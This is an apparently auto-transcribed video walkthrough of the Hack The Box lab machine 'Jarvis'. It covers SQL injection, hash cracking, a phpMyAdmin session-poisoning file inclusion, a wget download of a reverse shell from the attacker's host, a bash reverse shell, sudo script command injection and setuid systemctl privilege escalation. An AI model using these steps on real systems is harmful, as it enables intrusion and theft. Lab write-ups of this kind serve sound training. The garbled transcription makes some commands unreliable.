 what's going on YouTube the zipsak and we doing Jarvis from hack the box and I haven't looked at this box since release so expect the video to be a bit longer than normal the reason I didn't really want to prepare that much is because I remember this one being a good intro video to SQL injection so I wanted to show how I tackle the problem discover it the problems I run into and how I tackle this problems additionally there are three different ways to get user shell Miss box the first two are through PHP myadmin the first ones extracting a password out of the my sequel users table the second one is using load file and reading PHP config files and then the third way to get a shell in this box is to abuse the into out file portion of a sequel statement and just drop a file on the box itself once you get a shell on the box is a few things to do to prevent to the pepper user and then systemctl is a set UID I believe so you can just use that to create a malicious service and execute that to get a root shell so with all that being said let's just jump in as always we start over there and map so - SC for default scripts as V enumerate versions Oh a penny and map directory and call it Jarvis and then the IP address which is ten ten ten 1:43 can take some time to run so I've already ran it look at the results we have just two ports open the first one being SSH on port 22 and it's banner tells us it's a debian box we also have HTTP on port 80 and it's banner also tells us it's debian and an apache server then you also have the add map script HTTP - cookie - Flags telling us that when it requested the index page it returned the PHP session ID cookie so we know this server most likely runs PHP then you got the server header and HTTP title and the index page is just stark hotel so let's go and check out the page so going over to Firefox and go into 10 10 10 143 we can see the website it looks like a just hotel booking page so the first thing we're gonna do is send this over to go Buster while we manually look at it so we'll do go Buster dir for directory mood you for URL put in the URL and - w-4 word list user share word list and then dirt Buster directory list - 3 medium text you probably should do I think - poof out file let me just call this der boss - root dot log so let that run and start looking at the web page going to the very bottom at this contact information we see a bogus number and a email address we have super secure hotel at logger HT B so we have two potential things log on HTTP which could be a host name and also super secure hotel HT B so what I'm going to do is go into my terminal edit my host file and we will clean this up from a previous video and add 10-10-10 143 and this is super secure Hotel htb I think that's it and then logger HT be so adler's to in and then go to super secure hotel dot h DB we see we are at the same exact page log on each DB and again everything looks to be identical so that doesn't look like it got us anything so maybe just keep this in the back of our mind while we keep moving on other things looking at all these links like Facebook LinkedIn Twitter to see if there was maybe social media we could scrape to get employees and looking at the bottom left of the screen I just see it goes to slash pound which is the anchor tag which means it goes nowhere we also have super secure Hotel HDB and this top left we have a sign in and the sign in looking at the bottom left in my firefox window goes nowhere utilities gives nowhere so a lot of these links aren't really going anywhere we do have index dot PHP and then going to these we have rooms - Suites dot PHP and dining - Bart PHP one thing I do want to know is when I ran this go Buster initially I probably should have done a dash X basse PHP to specify PHP scripts if this doesn't find anything then we'll do that next so we do have a PHP my admin directory which is interesting we'll come back to that but going over to rooms let's see what this is this looks like a page looking at the book now we do have room dot PHP question mark Co D equals 1 and if we go to dining and bar and looking around these all have that anchor tag after it so clicking these links does nothing so pretty big indicator that we should do something with the rooms since this is the link that is taking us somewhere clicking book now we see we're at a page so what I'm gonna do is standard SQL injection just to add a single quote and then the comment and then we get the query died because it's not returning anything we can try a double quote and we get the same exact thing normally when things like this happen I'll send it over to W fuzz and do something white fuzzing so we can do W fuzz - you and then Co D one fuzz and then I think - W full word list let's do user share SEC list fuzzing and we want let's see special - cares txt so running this we'll see what we get and right off the bat we can probably hide all 404 errors because that's not interesting to us so I'll do - - H sefa hide code I think that's equals now I think it's just a space space 404 and now oh is it - - H capital C let's do w fuzz - H and let's see how to hide - - H C space I'm running this again oh we get a 404 error so let's go to the page and it says hey we have been bad and banned for 90 seconds so that sucks so that's probably why when I did this - - hc4 for everything returned as a for foyer one also is gonna stop happening is my go Buster's not gonna work so I don't know what triggered this so the next thing we're gonna do is probably just uhm do w fuzz first and if we get banned we know sending a weird special character bans us if we don't get banned then we know probably doing a heavy go buster against the site bans us and while we're banned we can check if it's the PHP app by just going to PHP myadmin and since we also get the error message here it means we got banned at Apache we could try a super-secure HDB to see if that has a Sun band it doesn't so it looks like we just have to wait that 90 seconds so I am unbanned now I can navigate to PHP my an admin just fine and we get user name password we can try just the default like admin admin and we don't get in nothing - inching there so let's go back and figure out what banned us the first thing that we want to test is this w fuzz command since this is what we're doing when we got banned so running this again and we're not getting oh we just got banned again so it looks like maybe there's a special character at the end of this that bans us so that could be interesting if we go into this special character list do a less against it I've got through the whole thing so and that's interesting but well OBE and we can just take a look at this and see what we can piece together so the next time we get unbanned we probably want to run this again and hide everything with 443 words or maybe five thousand nine hundred and sixteen characters because I'm kind of curious what these respond and pound let's just type these so type them here I guess and pound and nope pound isn't really too interesting we'll get at that second plus is interesting period and semicolon I should just put the pain that's why shirt done V weird cares dot txt so in all these and made the request behave differently looking at them we can probably take off the ampersand and pound sign because these generally mean special things in HTML I may not be an h2 in just web sites in general and is like an argument separator so if we had something after where is it the cod is equal to one and then yet and you maybe specify another variable so that's generally not too interesting the hash tag again that's the anchor so these things mean something in HTML and I don't know how W fuzz did the URL encoding all those so these are the three that are interesting this period means maybe it's defined as a integer and not a float let's just see what happens when we do like one point zero semicolon could be the end of a command or a sequel statement and plus could be like math the interesting thing here is we have the plus but not the - so looking at what - does we see let's see what is - I can do a search - come on whoa I guess - is not on the special character list because it should be highlighting yellow search again yeah maybe it's not there let's just check if we're still banned I think I killed enough time I did so let's send this over to a repeater and analyze what's happening so if we go to room dot php' question mark cot equals 1 this is the page we're at that has the room thing so to an intercept on my foxy proxy set to get a burp suite refresh the page press ctrl o to Senate repeater control shifter and now we're here so if we click send we have 6 5 - 2 bytes if we do a plus and see what we have 6 5 - 2 if we URL encode this plus we have 6 2 3 4 so I think W fuzz by default is doing URL encoding so at least we know that now and we can encode this send it forward and see what the page looks like we just get nothing per night so one thing we can do is 1+1 and if this returns a query then we know math works maybe put it in spaces spaces and quotes so that's not working we can try 2 minus 1 that works let's try 3 minus 1 we get something different so let's take note of this real quick so at room 1 were in the super family room so let's go back here room 1 super family room 2 is going to be the sweet sweet and room 3 is going to be a double ok now let's do minus 1 and we go to the sweet we do -2 we go to the superior family so we know we have math in here and we could also verify by putting like SQL statements like hex 3 still returns the double room so at this point I'm fairly confident we have SQL injection and I'm also confident the reason why we didn't see it earlier is because the statement doesn't use a single quote double quote so the statement something like let's see select let's see all the information we get we got an image so we can do image URL rating rating room name cost description and you've probably got ID because when we click go to book it would give us an ID so that's probably everything we have in this select statement and then we can do from the table name so this may be like from all rooms where Co D is equal to one so this could be a sample statement and since they ain't used quotes when we put a quote and then the comment earlier or the double quote we create an uneven number of quotes which calls the query to fail if we just do a - - space - it should work so there we have it and with my sequel we can always just go to like my sequel query structure and see everything we can do so if we look at this so at this point the first a second here it's right here so we did a select from and we're injecting into this where condition so we can do everything after this which includes where's Union group by window Union should be here we go to Union syntax don't you hate it when you pick a manual page and it's not what you think it's going to be well Union is right after this order this wave condition there should be a page that has the entire like my sequel structure but we can do unions that backfired on me so we can do Union one two three four five six well we can do it this way first one air to here three four five oh I think we need Union select you can't just do Union five six we still getting air seven and the query works so what this does is you have to have the same number of parameters on this right side as you do on the left side of the Select statement so since we have one two three four five six I guess we're missing one thing so there is an unknown here so unknown from rooms work Cod sequel to this and then we do Union so we have to have the same number here so there are seven things so that's why we have seven things in this Union hopefully that makes sense and then you can do things if you like put these in quotes you can overwrite what the Select statement pulled and then put information in here so we do this if we do Union select is it I think Union all select Oh if the queries bad you have nine nine nine nine and return nothing and then you put that Union in you can see what each parameter is so the cost is at parameter three if we edit three to be please subscribe we can place please subscribe there we can also run sequel statements so I'm going to do is let's just send this into repeater so it's a bit easier to work with hopefully would be easier to work with I haven't really prepped to do this video so if it's a bit bumpy that's why control while you're not on your L encoding control shift Ile they're not working anymore is that hockey gone right click convert selection URL your LD code and that's why I was hitting your L decode safer do send but maybe a pain see control you that's a bit easier read I always hate having all the presents we just have this piece so we always want to go to price - room so now if I click send go here hit enter okay this would be good so we can do select one and kind of do a nested query we have to do is select +1 to Euro encode that click price room and we don't want this in double quotes and we see we put one here so if we do like if we go to like a my sequel cheat sheet I always love googling these so like MySQL cheat sheet and will probably come to like pen tester monkey which is fine dev hints let's go to these two that's probably not what I want my sequel cheat sheet show user and all privilege let's see show tables I was looking for like showed database name I think we can just do so DB name like that now let's see let's just google it pen test monkey MySQL cheat sheet this is the one I normally like okay select a DAT version this would be for good select edit version click send and we can see we go to price room it's my sequel version 10 137 myriad DB so this shows how we can do queries and there is also the information schema table and the information schema table contains a bunch of information about everything in my sequel so if we Google information schema MySQL go to this table a page and this is kind of the structure of it the very first one we kind of want is like the schemata which is going to tell us all the databases so we can do schema name and schema is database and maya well so if we do select schema under school a name from information underscore schema dot-com otta and then click send go to price room we get nothing we do limit 1 we get hotel so if we do we can only return one line at a time if we're trying to return multiple lines we're airing out so how we control this is we do like 1 comma 1 and then we'll get information schema if we do 1 comma 2 we move down one that's MySQL and then 3 comma 1 we get performance schema I'm guessing 4 will be the hotel let's do 0 okay so the first one is hotel so all this is doing is this one says it returned one line this one is like the head command and showing hey grab the very first table limit it to one second limit one grab the second result limit to grab the third result and limit it to one line you could also do something a little bit complex with group can get to put all these in one line so if we did select and then the group competin can cat right here so group underscore 10 cat and then scheme a name and we want put them it in the separator which is semicolon from information schema let's try this I think I did group can cat probably not I never get this command right the very first time oh I did so we can see we returned everything on one line if you did this with like BR for line break and HTML it's fine I can do what I wanted to do let's do backslash n backslash n for like would return character and now I got hotel information schema MySQL performance schema so that's a good way to grab many things so let's rename this tab to group concat schemata and we'll create a new pane and let's go back into this and go into instead of schemata table let's jump all the way to the column stable there's gonna give us table schema this is going to be the table name the database name we want hotel the table name and column name is what one want to get out so we'll do good can can table name we want to semicolon column name underscore name and comma from information schema dot columns and then we want a where a table underscore schema is equal to hotel so if we click send here do price room we can get every piece of information out of this so this database only has one table the table is a room and the parameters are Co D name price description star image and mini so we're missing many I don't know what many is maybe mini thumbnail we could validate that by changing their query and let's just put this in a separate page where may be easier for you to read going back to terminal that's what we did we can on your own code that let's go back to her let's see if that works ctrl shift you why you it's so weird something hijacked my ctrl shift you because whenever I type that it's going underneath that here I don't think it's there Firefox I'm not sure what's hijacking it let's do convert selection your L decode grab paste so that's the query so the next thing we probably want to do is select group can cat there's really nothing interesting here there's no usernames or passwords so the next thing we could probably do is look in other databases there was hotel the next one was probably like MySQL then you got performance schema and you know that's why I put this in the tab Hotel MySQL performance schema and information schema this MySQL thing actually contains usernames and passwords so we can do let's we're table schema is equal to MySQL let's do it this way and we have to you encode this here control you price room so we can see all the columns mess MySQL thing column stat DB so DB has user is there a password so first prove let's see you have a password field let's see call improve user I was pretty sure that and this had a password field it's not users weird see I am doing table name column name let's see let's go to a cheat sheet select host user password from MySQL dot user I don't know why it's not showing us in this command but let's try this so this is gonna be host the column name is going to be user and then we need password from MySQL dot user I think it said yep and then let's go send see where's the price so we have localhost DB admin and this password so let's just put this here actually go there and I guess we'll crack it let's just crack it real quick I'm gonna go over to the Kraken which is my box I just had for cracking we go CD hash cat o V hashes Java stop my SQL paste this I'm guessing we don't want that star dot slash hash cat - - example hashes less MySQL once to grab - I MySQL so we need - beef before and one - a for after - so let's see what type of hash do we have I'm guessing it's going to be this one which is mode 300 so we could verify that by just doing echo - n paste that WC - C 40 characters and then we can do W C - C hashes Java stopped MySQL 41 probably 40 characters on a line break did I put one yeah so we can do dot slash hash cat - M 300 hashes jovis dot my sequel and we need a word list so - W opt word list Brock you and Oh No - W just slash and we can get this cracking shouldn't take too long to crack because this is an old hash format and we get it cracked already and the password is I miss you so we could have went through all that work and the alternative is we could have just taken advantage of a different my sequel feature instead of doing all this to extract information out of a database my sequel also has this thing called load file which is a command and we do Etsy passwd we can see we can read files we can also read source code so if we just do like room dot PHP and click send the go to the price room dot PHP maybe we have to do the path for dub dub dub HTML this is the default path for Apache and Debian price I don't get it we do index dot PHP what happens let's screwed something up I think let's do it see passwd just to make sure this works okay for some reason it doesn't like loading PHP files the thing why it may not like it is it may be executing everything between these PHP tags so we could do my sequel also asked to underscore base64 and try this so if we click send go to price I get base64 output that looks good of dub dub dub HTML room dot PHP click send go to price and we get base64 so that's good copy this out go to terminal we can do V room dot PHP dot be 64 paste it a 64 - D - room dot PHP let's just do this in vim and we can read files we do have a reporting 0 the skip parameter include connection dot PHP room object PHP and right here's where we can see the sequel injection they just have select star from room where Co D is equal to and then straight the get parameter you need to do I think parameter oh my god I'm blanking on the name SQL injection protection I think parameterised statements yeah there's probably what you want parametrize statements to protect against it or just use like a framework that will protect you against it by default but we want to probably get into connection PHP because that's how the script is going to connect into my sequel so we'll do the same exact thing but do connection dot PHP we click send go to price - and we get this save this them room dot PHP dot be 64 nope this is going to be connection dot PHP page 64 dash D connection to connection dot PHP read this and we get the credentials we got the user DB admin the password I miss you and connecting to the database which is hotel so we can check out the PHP myadmin so if we go to 10 10 10 143 PHP if my admin we can try these credentials so username DB is it lowercase a yep and then password I miss you and we get logged into PHP admin so the very first thing we want to do is try to figure out what version of PHP myadmin this is so let's see PHP versions PHP 7 but PHP myadmin is for 8 0 so let's just do PHP myadmin for 8 0 would you change log news for 0 is released April 7th 2018 so we can do probably search boy to see if there's any note exploits PHP myadmin holy cow there's a lot we got cross-site request forgery not too interesting authenticated local file inclusion one file read so let's look at this LF I search Boyd - x4 examine this let's see quest target so this is showing us how we can do a local file inclusion so index dot PHP target is equal to DB underscore SQL PHP and then this is a double URL encode percent to five is percent so this is doing percent 3f and three F is let's see if we do decoder percent 3f the code as X no X no no if we get rid of 3f 63 I'm not exactly sure what that's doing percent to five is definitely percent right to five three seven okay ascii hex there we go three F 3 F is question mark so if we go back in here it's doing a WOL encode to put a second question mark and they can give it the dot dot slashes and include a local file so let's see the next thing we have to do is trying to find a way to get cured execution and let's maybe just google it PHP myadmin 4 8 0 RS ee for remote code execution let's see bones bye so this one is walking through running a script and then getting your session ID and getting the output so what's happening here is in your PHP cookie its placing your session ID and then when you do a local file inclusion to the session ID you are able to execute the code so we'll walk through it twice the first time we'll do it without our shell in the box the second time we'll do it with the shell on the box so you can see exactly what happens so we just have to create a sequel statement first so we do select question mark PHP PHP info exit so let's go over to Firefox PHP myadmin do SQL and we need select PHP PHP info did he actually say exit after that okay yeah exit exit like that and then all they did was run the query and they did and single quotes so we'll do it in single quotes I don't think that matters but if we run this query by clicking go all we see is we printed query HP we just printed this we just do the Select on that so what I'm going to do is go to tools web developer storage and pull a cookie or storage there it is and we want the peach mean PHP myadmin session cookie so we'll grab copy it and then the second one was the LF I can get back to the page so it's doing on index dot PHP target is equal to DB underscore SQL dot PHP so and I keep thinking I'm in a different tab so we want index dot PHP question mark target is equal to this probably doesn't matter but we'll do DB underscore SQL PHP DB SQL dot PHP and this will that WRL encodes so percent to 5 is it 3 F 3 F comes in and then we can do a bunch of slashes and this is the default directory PHP keep sessions so 3 F bunch of slashes ver Lib PHP sessions cess underscore my key so I'm just copying this to a clipboard in case something redirects me I screwed up but I think I am good click go and well you got something weird let's see browser access we can try that again so this is showing me my PHP token we do PHP info I don't see it here so maybe I was just too slow so let's try this again username DB admin password is I miss you don't save SQL come on it's no way I crashed it it's ql copy this click SQL let's try this again select PHP PHP info I'm not gonna put the exit do that click go grab this and do this a bit quicker don't want to grab the line return okay cutie as with G still looks like my session there we go now we have it running so we definitely have code execution here so we could chain this to like download a file or just run a script we can put any PHP code we want there is a third way we can get onto this server so we'll do it that way oh I guess actually let's just finish and get code execution here so let's [Music] viii test dot PHP and let's just Google PHP remote file include thinking just do include HTTP 10 10 14 three slash t dot PHP when you're dealing with PHP cookies you do have a like limited amount of space before it just randomly inserts a bad character sometimes that's why I'm trying to keep this payload as short as possible if I run into errors here I'll probably just do like octal encoding on the IP address there's different ways you can refer to IP addresses IP octal convert we do this 10 10 14 3 I can also reference the IP by this so in Linux by paying this know paying 10 10 14 3 same thing with PHP include so cat test dot PHP that looks fine we can make the dub-dub-dub move test dot PHP and a dub dub dub and then V we can touch T dot PHP and PHP - capital S and then I think one 27001 colon 80 will launch a PHP server this is the same thing as like python simple HTTP server so now I can do HTTP 10 10 10 won twice Evan 0 0 1 and we want to get to test dot PHP and we didn't hear L I go into t dot PHP I could do PHP echo success let's see if able to open for inclusion be test dot PHP what if I screwed that up or maybe like remote include is off the other option is this PHP script is calling the PHP web server and the PHP web server itself is executing the script so there's nothing really to give over to the thing so let's just go ahead and try a PHP shell so we'll do so I think CP user share zip laudanum it's generally where I give my PHP web shell don't ask where it stands for I have no idea this is just a excellent shell so we do PHP reverse shell PHP we again delete all this and the main thing we want is it's just with IP so we want ten ten fourteen three port let's just do 9001 because that's what we like doing and that's all we need so let's just move this to thank T dot PHP yep so CP PHP River shell to T dot PHP and we'll host this with Python simple HTTP server and unlike the PHP one this won't execute PHP scripts so if we go back here to test dot PHP it's just giving us the PHP script so let's try this now good to this include and what we want is to run SQL and we'll do select question mark PHP and we want a cat what's a mess to include this okay we're just got to fix these quotes so let's click go and then here's the URL we want to hit start my server back up paste and something weird happen some errors have occurred on this server and we never hit our box so we can try this again let's just select this so SQL select go run and we'll still getting error messages so let's try changing up approach so we can do select PHP question mark PHP just wanna make this bigger system W get ten ten fourteen three slash T dot PHP so now we're just downloading a file at this point so click go go here we're not getting anything so what I'm going to do is clear out my PHP session cookie and we're gonna do this again so let's just grab this because maybe the cookie is just bad at this point DB admin I miss you SQL paste go grab this new cookie down here and we will paste it still do not download anything select wonder what it did not like we can dry SQL select PHP exec W get HTTP 1010 14 3 desktop PHP try this way click go run it work here don't have anything I'm going to do let's change up the way I do quotes so we'll do single quotes on the inside double quotes in the alt you'd be surprised about the small changes you make that suddenly just make it work also probably helps if I close it out still nothing I am 10 10 14 3 right yep so let's try this one last time I'm gonna do - tables - L know IP tables on the box simple HTTP servers running let's get a whole new session so delete this load the page username is going to be DB underscore admin I miss you SQL select PHP exec and then we want to do W get what do a - capital o de specify we want to save the file for dub dub dub HTML shell PHP and then we want HTTP 10 10 14 3 / t dot PHP okay so if we click go here grab this cookie taste said cookie that looks better and we download the file so maybe I had an error in my PHP or something where it just magically worked it's funny whenever you say the very last time things tend to work so if we go to 1010 14 3 what did I call it shell dot PHP so 1010 43 shell dot PHP and we just do n CL VMP 9001 we get a shell so that was the hard way to get a shell in this box the easy way is going all the way back so if you remember this Union injection so let's just on your own code it or go to the repeater tab so we got this Union select thing so let's just go back here and say select 1 so we got this and let's your land code this go so we can write anything here well we could also write PHP we can do PHP NFL just like we did before we just have to URL encode everything click go you can see where is it did not like that let's do single quotes go okay maybe it did like it before I just missed it but there it is so we can write that PHP thing here well we also can do if we go all the way back and read what we can do in SQL I'm gonna have it on I think anymore so MySQL we are we structure go to the reference manual you got a into dump file out file etc so if we go all the way back to burp and we say plus into plus out file plus and again there's pluses are just spaces it's just how URLs handle them for dub dub dub HTML please subscribe dot PHP we can write this file so going back here instead of test dot PHP please subscribe dot PHP and this needs to be 10 10 14 3 10 10 10 143 see we can write that file you have the 1 2 ahead and then 4 5 6 7 but we can execute code that way so you can drop the same exact thing we did before and drop a file that way so two ways to do this box to get a shell the second way is obviously much easier let's just take the show we have tonight exit that I did so and see L VMP 9001 let's get this shell back Python C input PTY P Tyr spawn then - and then sty we're all - echo hit F G you don't see it typing hit enter twice and now you have a proper shell that you have tap autocomplete so hopefully the video goes smoother here because we're on linux shell which I'm much more comfortable with freelancing here so ver Lib PHP sessions we can see we don't have permission to list the directory we have to be root to do that so we'll go into looking at the session cookie once we get root because we don't have execute permission we can root root so we're here we have right and T I don't know what T means but we don't have execute permission which means we can't get into this directory to list it if we know the phone name we can so if we did Firefox go back here this is going to be cats s underscore this right then I call my clipboard cats s underscore this there we go we can see the cookie so this is just a PHP object and you can see everything and right here we can see what we added to it so that is exactly how this is working we're just able to write something to our cookie and then when we include the cookie it's executing because it's between these PHP tags and it's just like local the standard PHP injection type things when you like poison a log file and then include the log file with your a PHP command same thing just in a cookie so hopefully that all makes sense but now let's go look at what we can do on this box doing sudo - shell we can see that the pepper you uh ww data can execute this admin utility script as the pepper user so I'm just going to export term is equal to X term so I can clear the screen so the first thing I want to do is look at this so LS - ow looking at the script we can execute it so let's bless it oh we can read it and let's see let's just execute it sudo - you pepper if I can type sudo - you tap I do that again so once Flags - ask for statistics - elder list the attackers IP so this is how it's detecting or attacks and - P - enter type e so if we do 10 10 14 3 it will ping that IP address so let's see exactly how that works I'm just going to cap this I'm actually just send the script to a box and see LVN p90 - script PI and we then see on this box we do so let's cat this NC 10 10 14 3 port 90 ok cat script PI we have it on a box so now we have a bit better TTY where we can examine this so the first thing to do is examine this the path nothing there see most risky web logs attack level dict exact ping so the bomb the script shows how the switch statement works so it executes the show header then if there's not an argument it does the help and exits if ciserek v1 is - H does help exits Scizor v1 it's really miss - s it's a show statistics - L West IP - be exact ping exact is always interesting so that's why i'm studing we search exact thing we can see this here forbidden ampersand semicolon - tactic double pipe and pipe so never mind I was thinking maybe this has something to do with the bad characters and w fuzz but audition did not work subtraction did work so this script was not screwing up things if any character in this forbidden is in what we enter for an IP it says got you and then exits otherwise it does ping + command so the special characters they're missing here is we can execute commands with the holy crap there we go like this and Who am I will execute the human eye command since the dollar sign and parentheses aren't in the forbidden characters we should be fine so if we hit up a few times to do this so you - - you pepper and then execute the script and do IPMI we don't really get anything right now it's hyung probably doing a DNS request to try to ping ww ping pepper because it's trying to ping the IP PE PPE or because that's the user we are running it as with sudo so there we go temporary failure and name resolution and it dies the very first thing I did with this is is probably do the sudo - new thing again and do negative one to see if this would just work very doublet dub and when utilities simple dot PI and it doesn't work so the student owner ability isn't working in this case if you do go sudo vulnerability and it's traced and it's like three weeks old so I was just saying if it could be ran here if we did sudo - you and then the pepper user ID which is one thousand for a dub dub dub admin utilities simple dot pi - P we see it at work so um yeah just different way to specify user names if it's out of the bounds of a 32-bit integer it defaulted to root and that was the bug but there has to be one other thing in the pseudo config I think it has to be all all but root or something or any command there's one small extra thing in this pseudo thing that requires for that bug to be present but I digress so will you have to get a shell in the box and remember there's a bunch of bad characters in this so we can't really just do dollar this reverse shell because the reverse shells probably contain some bad characters so what we're going to do is edit a file in temp we'll just call this shell dot SH and then do a reverse shell here so we'll do bash - C double quote bash - I single quote wait what is it - reverse shell pentest monkey let's just see what this is this is where I want so fast - see this let's put this in single quotes actually we don't need bash - see here cuz we can call bash that'll be fun so just need our IP address which is ten ten fourteen three and we can do 9001 so if we execute this script bash temp shell SH and CL VMP 9001 so we're listening all we do is get a reverse shell so now we just run this pepper thing again and we can do - temp shell SH and we're not using any bad characters so we get a shell as pepper now we do go into the home directory there is web and this is where the logs are stored of bad users you can see me and see all the queries I've done which caused me to get banned so we do sudo - shell here and it's taking a little bit it looks like it's probably doing a reverse DNS woke up on its hostname which doesn't exist so take some time I'm guessing that's what it's doing this suitor is taking way too long I'm think I'm just gonna kill it I'm not sure why it's taking so long and control saying killed everything oh that's funny hold on let's just do this again - temp shell dot Sh so I ran this here I did sue do - shell and look at the top pane it went over here so whatever I'm not directing something correctly this is probably like standard air let's cat let's see shadow nope not standard error because I just see this one of the outputs is going up here I don't know what that pseudo prompt says but let's do Python - see my PT y PT y dot spawn Ben - uh-uh control Z s TTY role - echo for ground it produce to do - oh now there we go it stays in this session so okay wasn't some weird timeout thing it was just going to a different window that I didn't pay attention to so now that were pepper we don't know peppers password so we can't just do sudo - L what we could probably do is we could either run lynnie Noom or just check for set UID binaries I think this is the command is it +4000 there we go - four thousand so we do - LS we can see permissions and this is just looking at all the set UID binaries it's generally the first thing I look at in Lindon noon so just drawn it here and we see one thing that is not standard is systemctl so I know that's not standard just because I've looked at the output of set UID binaries and boxes so much so the first thing I do is go over to GTFO binge github hide oh and look at this and it's a system CTO with set UID function we can do something with so looking at this we get instructions on what to do so here's instructions on if we had sudo we don't we have set UID so this is what we have to do so TF is equal to make this CH 1 plus S I don't know what this first command is doing but what this is doing is creating a file so we're doing this echo multiple lines into one file so let's do this and this make temp command all that's does it's an MK TMP is creates a random variable so that's all that does so let's do DF is equal to that and then we will echo this next thing wanted by this so these are three lines paste and this is echoing to that temp directory so if we go to slash temp oh it's one of these the dot service so let's go into dot service and it said exec start and it wants to execute ID I don't want to do ID let's just execute tab shell SH and let's make sure this gets hit with bash there we go it's our LS la then bash yes that exists so next thing we have to do is two commands we do link so systemctl link fail to link TF weird systemctl link this no such file or directory so maybe systemctl has to be in my directory which systemctl then this doesn't make sense when you're working link TF let's see let's just enable now let's move on see if this works so go up here NCL VMP 9001 does not look like it likes that damn let's move tab wait cut this okay that does exist so let's just move this into temp shell dot service and we'll link temp shell dot service one of something's just not correct in my script feed tempo at service in bash temp shota Sh that exists so let's do unit description is equal to shell and we got service exact Stewart install sure link show it out service see exact start let's just do temp shoulder Sh and we'll do then bash here chmod plus x let's see 10 let's try an able let's just copy this stuff out of temp and we'll put it into a home directory an able home pepper shell dot service that worked let's see did I do you thing here damn no it just did not like an attempt for whatever reason okay well now that I did enable we can just do Stewart unit service smell oh come on let's do link an able now show it service change this to be home pepper and shoulder service will be please work guard service link to please work dot service chmod plus x shoulder Sh and we can do the enable now and again I'm just getting enable now from this and we get a shell so it just really did not like being in Tim and that may just be because temp is mounted with probably no exact I had to guess let's see mount grab TMP I don't know mount grab no exact nothing actually exactly sure what's going on there but that is it so let's just go and look at this PHP thing real quick so ver Lib PHP sessions do LS la we can see all the PHP cookies so going back to PHP myadmin DB admin I miss you DB and then I miss you we can see what a cookie is by going to the storage tab or a storage storage inspector there we go so if we cat this file Katz s underscore this cats s underscore that we can see our cookie so this may be easier if let's see maybe cats s underscore said s semicolon RN it's not gonna work there we go so let's see where was I yeah this so this is just my PHP cookie and I was just trying to make it a bit more pretty or the output pretty I should say so if we run a query here so select please subscribe and click go it's going to put this in that cookie so we can see it right here SQL query and we put it in right here so if we do this so I support on patreon and man that is small quit go cat it again we no longer have oh we do so it does keep previous queries I was wrong so first grace like to please subscribe second query select support me on patreon so if you screw up doing PHP myadmin earlier on you may have to completely redo your cookie the other thing to maybe keep in mind is PHP myadmin is using double quotes already so you may want to use single quotes but yeah so if one of your things up top at bad PHP this stuff will not get executed because PHP will be reading this exit your code that be like right here crash and not read the rest of the file so that's probably what was happening to me earlier I just put in some bad PHP and that was all she wrote so with that being said that is the Box hope you guys enjoyed it take care and I will see you all next week